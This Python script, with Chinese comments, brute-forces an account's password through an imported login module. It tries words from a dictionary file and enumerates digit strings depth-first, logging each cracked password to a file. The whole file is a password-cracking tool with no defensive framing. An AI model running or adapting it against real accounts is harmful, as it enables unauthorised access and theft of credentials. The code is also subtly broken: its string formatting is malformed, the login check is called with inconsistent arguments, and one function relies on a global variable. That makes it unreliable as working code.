import login
from itertools import product

char_lib = "0123456789"

fout = open("vio_out.txt", "w+")


def violence_dict(username, length):
    """根据字典破解"""
    print("正在执行帐号： %s 的破解操作........." % username)
    f = open("dict.txt")
    while True:
        try_password = f.readline().strip()
        if not try_password:
            print('字典已比对完。')
            break
        if login.if_can_use(try_password):
            print("破解成功： 帐号 %s 的密码是 %s " % username, try_password)
            fout.write("破解成功： 帐号 %s 的密码是 %s " % username, try_password)
            break
        else:
            print("密码 %s 失败!" % try_password)
    return


def dfs(depth, max_length, now_username, try_password):
    if depth > max_length:
        return False
    for value in char_lib:
        try_password += str(value)
        if login.if_can_use(now_username, try_password):
            print("破解成功： 帐号 %s 的密码是 %s " % username, try_password)
            fout.write("破解成功： 帐号 %s 的密码是 %s " % username, try_password)
            return True
        else:
            print("密码 %s 失败!" % try_password)
        if dfs(depth+1, max_length, now_username, try_password):
            return True
        else:
            try_password = try_password[:-1]
    return


def violence_enmu(username, length):
    """暴力破解"""
    print("正在执行帐号： %s 的破解操作........." % username)
    dfs(1, length, username, "")
    return


if __name__ == '__main__':
    username = input("请输入尝试帐号：")
    length = input("输入最大长度：")
    violence_enmu(username, int(length))
